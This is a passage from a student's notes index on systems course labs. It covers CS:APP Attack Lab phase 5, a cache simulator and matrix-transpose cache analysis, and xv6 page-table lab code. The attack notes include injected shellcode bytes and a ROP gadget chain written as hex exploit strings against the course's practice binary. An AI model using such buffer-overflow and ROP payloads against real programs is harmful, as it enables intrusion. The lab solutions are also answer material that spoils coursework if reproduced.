HEX2RAW (note the reversal required for little-endian byte ordering).</li> </ul>"},{"location":"Systems/CSAPP/#phase5","title":"Phase5","text":"<p>The cookie in ASCII is: <code>35 39 62 39 39 37 66 61 00</code></p> <p>Old way is to pass the cookie as an rax into the register and move it into the stack memory address and called the memory address.</p> <pre><code>\\\\\\from phase_3, 0000000000000000 &lt;.text&gt;:\n   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi\n   7:   68 fa 18 40 00          pushq  $0x4018fa\n   c:   c3                      retq   \n\n48 c7 c7 a8 dc 61 55 68\nfa 18 40 00 c3 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 \n78 dc 61 55 00 00 00 00     ;the stack address of the previous\n35 39 62 39 39 37 66 61     ;store this cookie on the test stack\n00\n</code></pre> <pre><code>Idea is to make sure there is enough stack address that was able to get used in this case\n\n\n;use below instructions to load the stack address of the rdi, rsi will be used to set as an offset\n000000000000006a &lt;add_xy&gt;:\n  6a:   f3 0f 1e fa             endbr64 \n  6e:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax\n  72:   c3                      retq   \n\n; From the farm.asm file, only the instruction movl ecx,esi is being found, so we can only use this and pass around the registers\n; next find only the \nmov edx, ecx\nmov eax, edx\n// after adding bias.\npop rax,\nmov rax, rdi    ;rdi will be the top address of the stack on test\nmov rsp, rax\n</code></pre> <p></p> <pre><code>00 00 00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 00 00\n06 1a 40 00 00 00 00 00 \na2 19 40 00 00 00 00 00 \ncc 19 40 00 00 00 00 00 \n48 00 00 00 00 00 00 00 \ndd 19 40 00 00 00 00 00 \n70 1a 40 00 00 00 00 00 \n13 1a 40 00 00 00 00 00 \nd6 19 40 00 00 00 00 00 \na2 19 40 00 00 00 00 00 \nfa 18 40 00 00 00 00 00 \n35 39 62 39 39 37 66 61 00\n</code></pre>"},{"location":"Systems/CSAPP/#references","title":"References:","text":"<p>https://www.jianshu.com/p/db731ca57342</p> <p>https://zhuanlan.zhihu.com/p/60724948</p> <p>https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-5.html</p>"},{"location":"Systems/CSAPP/#lab4","title":"Lab4","text":""},{"location":"Systems/CSAPP/#part1","title":"Part1","text":"<p>Idea is to design sets -&gt; cache_lines, dynamic allocate memory</p> <p>Since we can only know the 2d array size after getting the size array from command line inputs, we have to dynamic allocate memory in this case.</p>"},{"location":"Systems/CSAPP/#struct-and-typedef-in-c","title":"struct and typedef in c","text":"<pre><code>//Struct:\nstruct struct_name {\n    // Member variables (also called fields or members)\n    type1 member1;\n    type2 member2;\n    // ...\n    typeN memberN;\n};\n// Define a structure named 'Person' with members name, age, and height\nstruct Person {\n    char name[50];\n    int age;\n    float height;\n};\n\nstruct Person {\n   // code\n} person1, person2, p[20];\nIn both cases,\n\n//person1 and person2 are struct Person variables\n//p[] is a struct Person array of size 20.\n\n\n// Declaring variables of type 'struct Person'\nstruct Person person1, person2;\n\n//typedef\n</code></pre> <p>https://www.programiz.com/c-programming/c-structures</p> <p></p> <p></p>"},{"location":"Systems/CSAPP/#lru-counter-logic","title":"LRU counter logic","text":"<p>Initialize LRU counter to 0 -&gt; valid bit is 0; free</p> <p>how to determine, if there is a find</p> <p>loop through each line to find smallest, if it is 0, directly assigned</p> <p></p> <p>booo, ez</p> <p>Full Code</p> <pre><code>#include \"cachelab.h\"\n#include &lt;unistd.h&gt;\n#include &lt;getopt.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\n#define uint_32max 1 &lt;&lt; 31;\n// finish the block of getting the command arguments\n\nstruct cache_line{\n    int valid_bit;\n    int tag;\n    int LRU_counter;\n}cache_line;\n\nstruct result{\n    int hit;\n    int miss;\n    int eviction;\n}result;\n\ntypedef struct cache_line *cache_line_entry;\ntypedef cache_line_entry *cache_set_entry;\n\nvoid usage(){\n    printf(\"Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\\n\");\n    printf(\"Options:\\n\");\n    printf(\"  -h         Print this help message.\\n\");\n    printf(\"  -v         Optional verbose flag.\\n\");\n    printf(\"  -s &lt;num&gt;   Number of set index bits.\\n\");\n    printf(\"  -E &lt;num&gt;   Number of lines per set.\\n\");\n    printf(\"  -b &lt;num&gt;   Number of block offset bits.\\n\");\n    printf(\"  -t &lt;file&gt;  Trace file.\\n\\n\");\n    printf(\"Examples:\\n\");\n    printf(\"  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\\n\");\n    printf(\"  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\\n\");\n\n}\n\n\nvoid update_result(char I,unsigned int address,cache_set_entry cache,int sets,int E,int b,int v){\n    unsigned set_index_cast = (1 &lt;&lt; sets) -1;\n\n    unsigned set_index = address &gt;&gt; b &amp; set_index_cast;\n\n    unsigned tag = address &gt;&gt; (sets+b);\n\n    int evict_true = 1;\n\n    unsigned smallest_LRU= uint_32max; //first initliaze, \n    unsigned replaced_LRU_index;\n\n    unsigned largest_LRU = 0;\n    // printf(\"%d %d \\n\", set_index, tag);\n    // load or store, trigger once\n\n    for (int i = 0; i &lt; E;i++){\n        if(cache[set_index][i].valid_bit == 0){\n            //if there is empty line, no need to evict\n            evict_true = 0;\n            replaced_LRU_index = i;\n            break;\n        }\n        else\n        {\n            if(cache[set_index][i].LRU_counter &lt;= smallest_LRU){\n                smallest_LRU = cache[set_index][i].LRU_counter;\n                replaced_LRU_index = i;\n            }\n        }\n    }\n\n    for (int i = 0; i &lt; E;i++){\n        if(cache[set_index][i].LRU_counter &gt; largest_LRU){\n            largest_LRU = cache[set_index][i].LRU_counter;\n        }\n    }\n\n        for (int i = 0; i &lt; E; i++)\n        {\n            if (cache[set_index][i].tag == tag &amp;&amp; cache[set_index][i].valid_bit == 1)\n            {\n                // found\n                result.hit++;\n                if(v){\n                    if (I != 'M')\n                    {\n                        printf(\" hit\\n\");\n                    }\n                    else if (I == 'M')\n                    {\n                        printf(\" hit\");\n                    }\n                }\n\n\n                // tmr question, how to handle LRU\n                cache[set_index][i].LRU_counter = largest_LRU + 1;\n                return;\n            }\n        }\n    //didn't find, miss++ and determine if need to evict\n\n    result.miss++;\n\n    if (evict_true)\n    {\n        if(v){\n            if(I == 'M'){\n                printf(\" miss eviction\");\n            }else{\n                printf(\" miss eviction\\n\");\n            }\n        }\n\n\n        result.eviction++;\n        cache[set_index][replaced_LRU_index].tag = tag;\n        cache[set_index][replaced_LRU_index].valid_bit = 1;\n        cache[set_index][replaced_LRU_index].LRU_counter = largest_LRU + 1;\n    }\n    else\n    {\n        if(v){\n            if(I == 'M'){\n                printf(\" miss\");\n            }else{\n                printf(\" miss\\n\");\n            }\n        }\n\n\n        cache[set_index][replaced_LRU_index].tag = tag;\n        cache[set_index][replaced_LRU_index].valid_bit = 1;\n        cache[set_index][replaced_LRU_index].LRU_counter = largest_LRU + 1;\n    }\n\n}\n\nvoid read_file(char* file,cache_set_entry cache,int sets,int E,int b,int v){\n    FILE *pFile;\n    char identifier;\n    unsigned address; //unsigned int\n    int size;\n\n\n    pFile = fopen(file, \"r\");\n    while (fscanf(pFile,\" %c %x,%d\",&amp;identifier,&amp;address,&amp;size)&gt;0)\n    {\n        /* code */\n\n        if(identifier == 'L' || identifier =='S'){\n            if(v){\n                printf(\"%c %x,%d\", identifier, address, size);\n            }\n\n            update_result(identifier, address, cache, sets, E, b,v);\n        }else if(identifier =='M'){\n            if(v){\n                printf(\"%c %x,%d\", identifier, address, size);\n            }\n            update_result(identifier, address, cache, sets, E, b,v);\n            update_result('R', address, cache, sets, E, b,v);\n        }\n\n        // doing actual code here\n\n    }\n    fclose(pFile);\n}\n\n\n\n\ncache_set_entry cache_init(int sets,int E){\n    int e = pow(2, sets); // equivalent to 1 &lt;&lt; sets;\n    // printf(\"%d\", e);\n    cache_set_entry cache = (cache_set_entry)malloc(e * sizeof(cache_line_entry));\n    //first allocate the memory of sets\n    for (int i = 0; i &lt; e;i++){\n        cache[i] = (cache_line_entry)calloc(E , sizeof(cache_line));\n    }\n    return cache;\n}\n\nvoid free_memory(cache_set_entry cache,int sets){\n    for (int i = 0; i &lt; sets;i++){\n        free(cache[i]);\n    }\n    free(cache);\n}\n\nint main(int argc,char** argv)\n{\n    //get the arguments\n\n    int opt, v = 0, s, e, b;\n    char* file;\n    cache_set_entry cache;\n    // the file initiliazer\n\n    while(-1 != (opt = getopt(argc,argv,\"hvs:E:b:t:\"))){\n        switch(opt){\n            case 'h':\n                usage();\n                return 0;\n            case 'v':\n                v = 1;\n                break;\n            case 's':\n                s = atoi(optarg);\n                break;\n            case 'E':\n                e = atoi(optarg);\n                break;\n            case 'b':\n                b = atoi(optarg);\n                break;\n            case 't':\n                file = (optarg);\n                // printf(\"%s\",file);\n                break;\n            default:\n                usage();\n                break;\n        }\n    }\n    //allocate memory\n    //question, how to set the index bit in the cache?\n    //s is used to define \n    // cache[S][E], S = 2^s, \n    cache = cache_init(s,e);\n\n    // for (int i = 0; i &lt; s;i++){\n    //     for (int j = 0; j &lt; e;j++){\n    //         printf(\"%d  %d \\n\",j, cache[i][j].valid_bit);\n    //     }\n    // }\n    read_file(file,cache,s,e,b,v);\n\n    printSummary(result.hit, result.miss, result.eviction);\n    free_memory(cache,s);\n    return 0;\n}\n</code></pre>"},{"location":"Systems/CSAPP/#part-b","title":"Part B:","text":"<p>1 kilobytes of cache, E =1, Block size = 32bytes = 2^5, S = 5, 32 sets</p> <p>int = 4bytes, 32/4 = 8, it can fit 8ints, </p>"},{"location":"Systems/CSAPP/#32-x-32","title":"32 x 32","text":"<p>Explain on why diagnose will cause the cache hit the same set</p>"},{"location":"Systems/CSAPP/#memory-address-to-cache-index-mapping","title":"Memory Address to Cache Index Mapping","text":"<p>In a direct-mapped cache, the cache index is determined by the formula:</p> <p>Index=(Memory Address/Block Size)%Number of Sets\\text{Index} = (\\text{Memory Address} / \\text{Block Size}) \\% \\text{Number of Sets}Index=(Memory Address/Block Size)%Number of Sets</p> <p>Given your cache parameters:</p> <ul> <li>Cache Size: 1 KB (1024 bytes)</li> <li>Block Size: 32 bytes</li> <li>Number of Sets: 32</li> </ul>"},{"location":"Systems/CSAPP/#example-calculation-address-and-index-for-akk","title":"Example Calculation: Address and Index for <code>A[k][k]</code>","text":"<p>For diagonal element <code>A[k][k]</code> in a 32x32 matrix:</p> <ol> <li>Memory Address Calculation:</li> <li>Base address of <code>A</code> (assumed): <code>Base Address(A) = 0x00000000</code></li> <li>Address of <code>A[k][k]</code>: Address(A[k][k])=Base Address(A)+(k\u00d732+k)\u00d74\\text{Address}(A[k][k]) = \\text{Base Address}(A) + (k \\times 32 + k) \\times 4Address(A[k][k])=Base Address(A)+(k\u00d732+k)\u00d74 =0x00000000+(k\u00d732+k)\u00d74= 0x00000000 + (k \\times 32 + k) \\times 4=0x00000000+(k\u00d732+k)\u00d74 =(k\u00d733)\u00d74= (k \\times 33) \\times 4=(k\u00d733)\u00d74 =k\u00d7132= k \\times 132=k\u00d7132</li> <li>Cache Index Calculation:</li> <li>Index=(k\u00d7132/32)%32\\text{Index} = (k \\times 132 / 32) \\% 32Index=(k\u00d7132/32)%32</li> <li>=(k\u00d74.125)%32= (k \\times 4.125) \\% 32=(k\u00d74.125)%32</li> </ol>"},{"location":"Systems/CSAPP/#example-calculation-address-and-index-for-bkk","title":"Example Calculation: Address and Index for <code>B[k][k]</code>","text":"<p>For diagonal element <code>B[k][k]</code> in a 32x32 matrix:</p> <ol> <li>Memory Address Calculation:</li> <li>Base address of <code>B</code> (assumed): <code>Base Address(B) = 0x00008000</code></li> <li>Address of <code>B[k][k]</code>: Address(B[k][k])=Base Address(B)+(k\u00d732+k)\u00d74\\text{Address}(B[k][k]) = \\text{Base Address}(B) + (k \\times 32 + k) \\times 4Address(B[k][k])=Base Address(B)+(k\u00d732+k)\u00d74 =0x00008000+(k\u00d732+k)\u00d74= 0x00008000 + (k \\times 32 + k) \\times 4=0x00008000+(k\u00d732+k)\u00d74 =0x00008000+(k\u00d733)\u00d74= 0x00008000 + (k \\times 33) \\times 4=0x00008000+(k\u00d733)\u00d74 =0x00008000+k\u00d7132= 0x00008000 + k \\times 132=0x00008000+k\u00d7132</li> <li>Cache Index Calculation:</li> <li>Index=((0x00008000+k\u00d7132)/32)%32\\text{Index} = ((0x00008000 + k \\times 132) / 32) \\% 32Index=((0x00008000+k\u00d7132)/32)%32</li> <li>=((0x00008000/32)+(k\u00d7132/32))%32= ((0x00008000 / 32) + (k \\times 132 / 32)) \\% 32=((0x00008000/32)+(k\u00d7132/32))%32</li> <li>=(0x2000+k\u00d74.125)%32= (0x2000 + k \\times 4.125) \\% 32=(0x2000+k\u00d74.125)%32</li> </ol>"},{"location":"Systems/CSAPP/#simplifying-the-index-calculation","title":"Simplifying the Index Calculation","text":"<p>To see if <code>A[k][k]</code> and <code>B[k][k]</code> map to the same index, we need to examine the modulo operation:</p> <ol> <li>For <code>A[k][k]</code>:</li> <li>(k\u00d74.125)%32(k \\times 4.125) \\% 32(k\u00d74.125)%32</li> <li>For <code>B[k][k]</code>:</li> <li>The base address <code>0x00008000</code> converts to 32768 in decimal.</li> <li>(32768/32)=1024(32768 / 32) = 1024(32768/32)=1024</li> <li>1024%32=01024 \\% 32 = 01024%32=0</li> <li>Therefore, the index calculation for <code>B[k][k]</code> simplifies to: (0+k\u00d74.125)%32(0 + k \\times 4.125) \\% 32(0+k\u00d74.125)%32</li> <li>=(k\u00d74.125)%32= (k \\times 4.125) \\% 32=(k\u00d74.125)%32</li> </ol>"},{"location":"Systems/CSAPP/#conclusion","title":"Conclusion","text":"<p>Both <code>A[k][k]</code> and <code>B[k][k]</code> indeed map to the same cache index because the addition of the base address <code>0x00008000</code> results in a zero modulo 32, effectively making the cache index calculation dependent only on the <code>k \\times 4.125</code> term for both matrices.</p>"},{"location":"Systems/CSAPP/#cache-conflict-explanation","title":"Cache Conflict Explanation","text":"<p>Since both <code>A[k][k]</code> and <code>B[k][k]</code> map to the same cache index, they will contend for the same cache line. When you read <code>A[k][k]</code> and then write <code>B[k][k]</code>, the cache line for <code>A</code> gets evicted and replaced by the line for <code>B</code>. This causes a cache miss the next time you access <code>A[k][k]</code> or <code>B[k][k]</code>.</p>"},{"location":"Systems/CSAPP/#64-x-64","title":"64 x 64","text":"<p>https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&amp;utm_medium=referral</p> <p>https://zhuanlan.zhihu.com/p/387662272</p> <p>https://zhuanlan.zhihu.com/p/42754565</p> <p>https://zhuanlan.zhihu.com/p/79058089</p>"},{"location":"Systems/OS/","title":"OS","text":""},{"location":"Systems/OS/#pipe","title":"Pipe","text":"<p>A pipe is a small kernel buffer exposed to processes as a pair of file descriptors, one for reading and one for writing. Writing data to one end of the pipe makes that data available for reading from the other end of the pipe. Pipes provide a way for processes to communicate. <p>Pipe is a shared resource(file descriptor) that allows two process to interchange data with each other, fork() won't create a duplicate of the pipe.</p>"},{"location":"Systems/OS/#fork-process","title":"Fork (Process)","text":"<p>fork(), </p> <p>A process may create a new process using the fork system call. Fork gives the new process exactly the same memory contents (both instructions and data) as the calling process. Fork returns in both the original and new processes. In the original process, fork returns the new process\u2019s PID. In the new process, fork returns zero. The original and new processes are often called the parent and child.</p> <pre><code>int pid = fork();\nif(pid &gt; 0){\n    printf(\"parent: child=%d\\n\", pid);\n    pid = wait((int *) 0);\n    printf(\"child %d is done\\n\", pid);\n} else if(pid == 0){\n    printf(\"child: exiting\\n\");\n    exit(0);\n} else {\n    printf(\"fork error\\n\");\n}\n</code></pre>"},{"location":"Systems/OS/#wait","title":"wait","text":"<p>The wait system call returns the PID of an exited (or killed) child of the current process and copies the exit status of the child to the address passed to wait; if none of the caller\u2019s children has exited, <code>wait</code> waits for one to do so. If the caller has no children, <code>wait</code> immediately returns -1. If the parent doesn\u2019t care about the exit status of a child, it can pass a 0 address to wait.</p> <p>Short Summary:  For this code below, the <code>wait</code> will wait until child completes and it will store the child exit status into the <code>&amp;status</code> which is a user-defined variable, the wait will return the child process ID which store in the <code>terminate_pid</code> below.</p> <p><code>pid_t terminated_pid = wait(&amp;status); // Wait for child to terminate</code></p>"},{"location":"Systems/OS/#pipe-and-xargs-in-unix","title":"Pipe and Xargs in Unix","text":"<p>Input Handling:</p> <ul> <li>Pipe (<code>|</code>): Directly connects the output of one command to the input of another.</li> <li><code>xargs</code>: Reads input from stdin and converts it into command-line arguments for another command.</li> </ul> <p>Command Compatibility:</p> <ul> <li>Pipe (<code>|</code>): Best used when the receiving command can process input from stdin.</li> <li><code>xargs</code>: Useful when the receiving command does not read from stdin but instead requires command-line arguments.</li> </ul> <p>Flexibility:</p> <ul> <li>Pipe (<code>|</code>): Simpler and more straightforward for linear data flow.</li> <li><code>xargs</code>: Offers more flexibility with options to handle arguments, such as <code>-n</code> (number of arguments per command line), <code>-I</code> (replace string), and <code>-0</code> (null-terminated input).</li> </ul>"},{"location":"Systems/OS/#summary","title":"Summary","text":"<ul> <li>Pipe (<code>|</code>): Use when you want to pass the output of one command directly as input to another command that reads from stdin.</li> <li><code>xargs</code>: Use when you need to convert input from stdin into command-line arguments for a command that does not read from stdin.</li> </ul> <p>here</p>"},{"location":"Systems/OSlab/","title":"OS Lab","text":""},{"location":"Systems/OSlab/#gdb","title":"GDB","text":"<p>To debug the QEMU, type <code>make qemu-gdb</code> to start debugging</p> <p>Open a new windows, type <code>gdb-multiarch</code> to connect the xv6, add a breakpoint where to debug and continue.</p> <p>Some common commands.</p> <p><code>s</code>/<code>stepi</code> step into the code line by line</p> <p><code>n</code> go into the next statement</p> <p><code>tui enable</code> this will open a GUI that where the breakpoint currently locates inside the code</p> <p><code>layout asm</code> this will open a GUI that layout the breakpoint in assembly</p> <p><code>layout reg</code> this will open a GUI and layout all the registers values</p> <p><code>layout src</code> go back the original src file</p>"},{"location":"Systems/OSlab/#lab1-xv6-and-unix-utilities","title":"Lab1: Xv6 and Unix utilities","text":""},{"location":"Systems/OSlab/#lab2-system-calls","title":"Lab2: system calls","text":""},{"location":"Systems/OSlab/#lab3-page-tables","title":"Lab3: page tables","text":"<p>The lab manual can be found here.https://pdos.csail.mit.edu/6.828/2021/labs/pgtbl.html</p>"},{"location":"Systems/OSlab/#speed-up-system-calls-easy","title":"Speed up system calls (easy)","text":"<p>Purpose: speed up certain system calls by sharing data in a read-only region between user space and the kernel. This task is to map one read-only page at USYSCALL( a virtual address defined in memlayout.h). At the start of this page, store a <code>struct usyscall</code> (also defined in <code>memlayout.h</code>), and initialize it to store the PID of the current process.</p> <pre><code>//proc.h\nstruct proc {\n  struct spinlock lock;\n\n  // p-&gt;lock must be held when using these:\n  enum procstate state;        // Process state\n  void *chan;                  // If non-zero, sleeping on chan\n  int killed;                  // If non-zero, have been killed\n  int xstate;                  // Exit status to be returned to parent's wait\n  int pid;                     // Process ID\n\n  // wait_lock must be held when using this:\n  struct proc *parent;         // Parent process\n\n  // these are private to the process, so p-&gt;lock need not be held.\n  uint64 kstack;               // Virtual address of kernel stack\n  uint64 sz;                   // Size of process memory (bytes)\n  pagetable_t pagetable;       // User page table\n  struct trapframe *trapframe; // data page for trampoline.S\n  struct context context;      // swtch() here to run process\n\n  struct file *ofile[NOFILE];  // Open files\n  struct inode *cwd;           // Current directory\n  char name[16];               // Process name (debugging)\n  // add the struct to store the shared page table\n  struct usyscall *usyscall;   //get pid\n};\n\n//proc.c\nstatic struct proc*\nallocproc(void)\n{\n  struct proc *p;\n\n  for(p = proc; p &lt; &amp;proc[NPROC]; p++) {\n    acquire(&amp;p-&gt;lock);\n    if(p-&gt;state == UNUSED) {\n      goto found;\n    } else {\n      release(&amp;p-&gt;lock);\n    }\n  }\n  return 0;\n\nfound:\n  p-&gt;pid = allocpid();\n  p-&gt;state = USED;\n\n\n  // Allocate a trapframe page.\n  if((p-&gt;trapframe = (struct trapframe *)kalloc()) == 0){\n    freeproc(p);\n    release(&amp;p-&gt;lock);\n    return 0;\n  }\n  //Allocate a USYSCALL page, my implementation\n  if((p-&gt;usyscall = (struct usyscall *)kalloc()) == 0){\n    freeproc(p);\n    release(&amp;p-&gt;lock);\n    return 0;\n  }\n  //share the pid between userspace and the kernel\n  p-&gt;usyscall-&gt;pid = p-&gt;pid;\n  // An empty user page table.\n  p-&gt;pagetable = proc_pagetable(p);\n  if(p-&gt;pagetable == 0){\n    freeproc(p);\n    release(&amp;p-&gt;lock);\n    return 0;\n  }\n\n  // Set up new context to start executing at forkret,\n  // which returns to user space.\n  memset(&amp;p-&gt;context, 0, sizeof(p-&gt;context));\n  p-&gt;context.ra = (uint64)forkret;\n  p-&gt;context.sp = p-&gt;kstack + PGSIZE;\n\n  return p;\n}\n\n\n// Create a user page table for a given process,\n// with no user memory, but with trampoline pages.\npagetable_t\nproc_pagetable(struct proc *p)\n{\n  pagetable_t pagetable;\n\n  // An empty page table.\n  pagetable = uvmcreate();\n  if(pagetable == 0)\n    return 0;\n\n  // map the trampoline code (for system call return)\n  // at the highest user virtual address.\n  // only the supervisor uses it, on the way\n  // to/from user space, so not PTE_U.\n  if(mappages(pagetable, TRAMPOLINE, PGSIZE,\n              (uint64)trampoline, PTE_R | PTE_X) &lt; 0){\n    uvmfree(pagetable, 0);\n    return 0;\n  }\n\n  // map the trapframe just below TRAMPOLINE, for trampoline.S.\n  if(mappages(pagetable, TRAPFRAME, PGSIZE,\n              (uint64)(p-&gt;trapframe), PTE_R | PTE_W) &lt; 0){\n    uvmunmap(pagetable, TRAMPOLINE, 1, 0);\n    uvmfree(pagetable, 0);\n    return 0;\n  }\n\n  //create a page for usyscall and map with READ only and also allow it to be accessed by the USER.\n  if(mappages(pagetable, USYSCALL, PGSIZE,\n              (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; 0){\n    uvmunmap(pagetable, TRAMPOLINE, 1, 0);\n    uvmunmap(pagetable, TRAPFRAME, 1, 0);\n    uvmfree(pagetable, 0);\n    return 0;\n  }\n\n  return pagetable;\n}\n\n// Don't forget to free the leaf of the USYSCALL page, else it will cause a leaf panic error\n// Free a process's page table, and free the\n// physical memory it refers to.\nvoid\nproc_freepagetable(pagetable_t pagetable, uint64 sz)\n{\n  uvmunmap(pagetable, TRAMPOLINE, 1, 0);\n  uvmunmap(pagetable, TRAPFRAME, 1, 0);\n  uvmunmap(pagetable, USYSCALL, 1, 0);\n  uvmfree(pagetable, sz);\n}\n</code></pre>"},{"location":"Systems/OSlab/#print-a-page-table-easy","title":"Print a page table (easy)","text":"<p>Purpose: Print the contents of a page table</p> <p>Define a function called <code>vmprint()</code>. It should take a <code>pagetable_t</code> argument, and print that pagetable in the format described below. Insert <code>if(p-&gt;pid==1) vmprint(p-&gt;pagetable)</code> in exec.c just before the <code>return argc</code>, to print the first process's page table. You receive full credit for this part of the lab if you pass the <code>pte printout</code> test of <code>make grade</code>.</p> <pre><code>//vm.c\n//use recursion to print the pte on page tables\nvoid vmprint(pagetable_t pagetable,int r)\n{\n  // r =0. first r\n  char *format =\"\";\n  if(r == 0){\n    pte_t pa = (uint64)pagetable;\n    printf(\"page table %p\\n\",pa);\n    format = \"..\";\n    r++;\n  }else if(r ==1){\n    format = \".. ..\";\n    r++;\n  }else if(r==2){\n    format = \".. .. ..\";\n    r++;\n  }\n\n  for(int i=0;i&lt;512;i++){\n    pte_t pte = pagetable[i];\n    //if there is a valid page\n    if((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R|PTE_W|PTE_X)) == 0){\n      // this PTE points to a lower-level page table.\n\n      //PTE2PA will get the next page PA address\n      uint64 child = PTE2PA(pte);\n      printf(\"%s%d: pte %p pa %p\\n\",format,i,pte,child);\n      // printf(\"child %p\\n\",child);\n      vmprint((pagetable_t)child,r);\n    } else if(pte &amp; PTE_V){ //these are the leaf of the page\n      uint64 child = PTE2PA(pte);\n      printf(\"%s%d: pte %p pa %p\\n\",format,i,pte,child);\n\n    }\n  }\n\n}\n\n\n//exec.c\n//add this code in int exec(char *path, char **argv) before the return argument to allow it to print the page table when the pid is 1\n  if(p-&gt;pid ==1) vmprint(p-&gt;pagetable,0);\n</code></pre>"},{"location":"Systems/OSlab/#detecting-which-pages-have-been-accessed-hard","title":"Detecting which pages have been accessed (hard)","text":"<p>Purpose: Based on the input arguments, determine which pages have been accessed(read or write).</p> <p>Your job is to implement <code>pgaccess()</code>, a system call that reports which pages have been accessed. The system call takes three arguments. First, it takes the starting virtual address of the first user page to check. Second, it takes the number of pages to check. Finally, it takes a user address to a buffer to store the results into a bitmask (a datastructure that uses one bit per page and where the first page corresponds to the least significant bit). You will receive full credit for this part of the lab if the <code>pgaccess</code> test case passes when running <code>pgtbltest</code>.</p> <p></p> <pre><code>//riscv.h\n#define PTE_A (1L &lt;&lt; 6) //Access Bit\n\n//sysproc.c\n\n#ifdef LAB_PGTBL\nint\nsys_pgaccess(void)\n{\n  //parse arugments\n  uint64 va;\n  int num;\n  uint64 buffer; //buffer to store the result in bitmask ds\n  int ans = 0;\n  if(argaddr(0,&amp;va) &lt; 0) return -1;\n  if(argint(1,&amp;num)&lt;0) return -1;\n  if(argaddr(2,&amp;buffer)&lt;0) return -1;\n\n  struct proc *p = myproc(); //get the current process status\n  pagetable_t pagetable = p-&gt;pagetable; //the user page table\n\n  for(int i=0;i&lt;num;i++){\n    pte_t *pte;\n    pte = walk(pagetable,va+ (i * PGSIZE),0);\n\n    if((pte != 0) &amp;&amp; (*pte &amp; PTE_A)){\n      ans = ans | (1 &lt;&lt; i);\n      *pte = *pte ^ PTE_A;\n    }\n  }\n  //copy the answer from kernel to the user space, stored in the third input argument ans,\n    //copy byte by byte\n  if(copyout(pagetable,buffer,(char *)&amp;ans,sizeof(int)) &lt; 0){\n    return -1;\n  }\n  return 0;\n//pgaccess(buf, 32, &amp;abits)\n\n}\n#endif\n</code></pre>"},{"location":"Systems/OSlab/#bitmask-data-structure","title":"Bitmask data structure:","text":"<p>Bitmask Basics:</p> <ul> <li>Representation: A bitmask is typically represented as an integer where each bit corresponds to a specific option, flag, or element.</li> <li>For example, an 8-bit bitmask can represent up to 8 different flags or states, with each bit in the byte being either <code>0</code> (off/false) or <code>1</code> (on/true).</li> <li>Efficiency: Bitmasks are efficient because they allow you to represent multiple states or flags within a single integer, using very little memory (e.g., 1 byte can store 8 flags).</li> <li>Common Uses:</li> <li>Flags: In many programming languages, bitmasks are used to store flags, where each bit in the bitmask represents a different flag.</li> <li>Permissions: Bitmasks are often used to store permission bits, where each bit represents a different permission (e.g., read, write, execute).</li> <li>Presence of Elements: In algorithms, bitmasks can be used to represent whether certain elements or conditions are present.</li> </ul>"},{"location":"Systems/OSlab/#explanation-of-byte-pointer","title":"Explanation of Byte Pointer:","text":"<ul> <li> <p>Pointer Basics:</p> </li> <li> <p>A pointer is a variable that holds the memory address of another variable.</p> </li> <li> <p>The type of the pointer determines how the memory is accessed. For example, an <code>int*</code> pointer is expected to point to an <code>int</code> and thus access 4 bytes of memory (on most systems), whereas a <code>char*</code> pointer (byte pointer) accesses 1 byte of memory.</p> </li> <li> <p>Byte Pointer (<code>char\\*</code>):</p> </li> <li>A <code>char*</code> or <code>unsigned char*</code> pointer is often referred to as a byte pointer because <code>char</code> typically represents a single byte (8 bits) of data.</li> <li>With a byte pointer, you can perform fine-grained memory operations, such as accessing and modifying memory byte by byte.</li> </ul>"},{"location":"Systems/OSlab/#example-of-byte-pointer-usage","title":"Example of Byte Pointer Usage:","text":"<p>Consider a scenario where you have an integer value, but you want to access or manipulate its bytes individually:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num = 0x12345678;   // A 4-byte integer\n    char *byte_ptr = (char*)&amp;num;  // Cast the address of num to a byte pointer\n\n    // Access and print each byte of the integer\n    for(int i = 0; i &lt; sizeof(int); i++) {\n        printf(\"Byte %d: 0x%x\\n\", i, byte_ptr[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"Systems/OSlab/#explanation","title":"Explanation:","text":"<ul> <li>Memory Representation</li> <li><code>num</code> is a 4-byte integer. Its value <code>0x12345678</code> will be stored in memory as four bytes: <code>0x12</code>, <code>0x34</code>, <code>0x56</code>, <code>0x78</code>.</li> <li>Pointer Cast</li> <li><code>char* byte_ptr = (char*)#</code> converts the address of <code>num</code> (which is an <code>int*</code>) to a <code>char*</code>, allowing you to access the individual bytes of the integer.</li> <li>Byte-by-Byte Access</li> <li><code>byte_ptr[i]</code> accesses the <code>i</code>-th byte of <code>num</code>. Since <code>byte_ptr</code> is a <code>char*</code>, <code>byte_ptr[i]</code> accesses the memory one byte at a time.</li> </ul>"},{"location":"Systems/OSlab/#output","title":"Output:","text":"<pre><code>Byte 0: 0x78\nByte 1: 0x56\nByte 2: 0x34\nByte 3: 0x12\n</code></pre>"},{"location":"Systems/OSlab/#why-use-a-byte-pointer","title":"Why Use a Byte Pointer?","text":"<ul> <li>Memory Manipulation: Byte pointers are useful when you need to manipulate data at a low level, such as copying raw memory, accessing specific bytes in a larger data structure, or working with binary data formats.</li> <li>Typecasting: Often, you might cast a higher-level pointer (e.g., <code>int*</code>, <code>float*</code>) to a <code>char*</code> to inspect or manipulate its bytes, as seen in the example above.</li> </ul>"},{"location":"Systems/OSlab/#summary","title":"Summary","text":"<p>I enhance some interesting things that i never notice before, <code>copyout(pagetable,buffer,(char *)&amp;ans,sizeof(int))</code> this function is actually copying the data byte by byte, and it is a really useful technique if we want to write a generic function that accept different data types arguments and 